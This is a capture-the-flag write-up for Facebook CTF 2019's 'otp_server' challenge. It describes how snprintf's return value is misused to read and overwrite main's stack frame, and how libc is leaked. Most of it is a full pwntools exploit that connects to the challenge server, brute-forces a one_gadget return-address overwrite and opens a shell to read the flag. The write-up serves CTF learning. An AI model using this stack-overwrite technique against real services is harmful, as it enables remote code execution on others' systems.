# Facebook CTF 2019 - otp_server

```
void __fastcall encrypt_message(void *main_var_ptr)
{
  int v1; // ST1C_4
  __int64 v2; // ST20_8

  v1 = get_rand_val();
  *(_DWORD *)main_var_ptr = v1;
  v2 = snprintf((char *)main_var_ptr + 4, 0x104uLL, "%s", g_buffer);
  *(_DWORD *)((char *)main_var_ptr + v2 + 4) = v1;
  xor_encrypt(main_var_ptr);
  print_result(main_var_ptr, v2 + 8);
}
```
get_rand_val() reads 4bytes from /dev/urandom, whose values we cannot know.
In main, there is buffer that can store 0x108 bytes. snprintf func has vulnerability.

snprintf returns the length of result string printed at buffer if buffer was large enough.
Though snprintf limits the length of result string by 0x104, it can return the value larger than 0x104.
It's because g_buffer and g_key are adjacent. We send 0x100 non-null bytes in get_message(), then
`sprintf(..., g_buffer)` returns `0x100 + length of g_key`. Eventually this vulnerability enables
reading and writing main func's stackframe.

So we read main func's return address, which is __libc_start_main, calculating libc base address.
Then overwrites the return address with one gadget.
But the value that is overwritten is random value. We should do bruteforce-like attack.

xor_encrypt() encrypts given message with the key, and print_result() prints the encrypted message.
We can know the random value with first four bytes from printed message. So repeatedly call encrypt_message() until the printed values equals
the value that we want to overwrite. We should write 8 bytes(one gadget address, e.g. 0x00007fff12345678).
To make exploit fast, writing was done eight times, one byte at a time.

```
ssize_t set_key()
{
  return read(0, g_key, 0x108uLL);
}

ssize_t get_message()
{
  return read(0, g_buffer, 0x100uLL);
}

.bss:00000000002020E0 ; char g_buffer[256]
.bss:00000000002020E0 g_buffer        db 100h dup(?)
.bss:00000000002020E0                               
.bss:00000000002021E0 ; char g_key[264]
.bss:00000000002021E0 g_key           db 108h dup(?)
```
from pwn import *

bin = ELF('./otp_server')
libc = ELF('./libc-2.27.so')

# context.log_level = 'debug'
one_gadget_offset = 0x10a38c


def SetKey(key):
    conn.sendafter('>>> ', str(1))
    conn.sendafter('Enter key:\n', key)


def Encrypt(msg):
    conn.sendafter('>>> ', str(2))
    conn.sendafter('Enter message to encrypt:\n', msg)


# conn = process('./otp_server', env={'LD_PRELOAD':'./libc-2.27.so'})
# gdb.attach(conn, '')
conn = remote('challenges.fbctf.com', 1338)

SetKey('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
Encrypt('B'*0x100)
conn.recvuntil('-----\n')
conn.recv(0x118)
libc_addr = u64(conn.recv(8)) - 0x21b97
one_gadget_addr = libc_addr + one_gadget_offset

log.info('libc_addr: ' + hex(libc_addr))
log.info('one_gadget_addr: ' + hex(one_gadget_addr))


key = 'AAAAAAAAAAAAAAAAAAA\x00'
for i in range(8):
    key = 'A' + key
    SetKey(key)

    while True:
        find_byte = (one_gadget_addr >> (8 * i)) & 0xff

        Encrypt('B'*0x100)
        conn.recvuntil('-----\n')
        val = u8(conn.recv(1)) ^ 0x41

        if val == find_byte:
            log.info(hex(find_byte)+' matched')
            break

conn.sendafter('>>> ', str(3))
conn.sendline('cd home;cd otp_server;cat flag')
conn.interactive()
```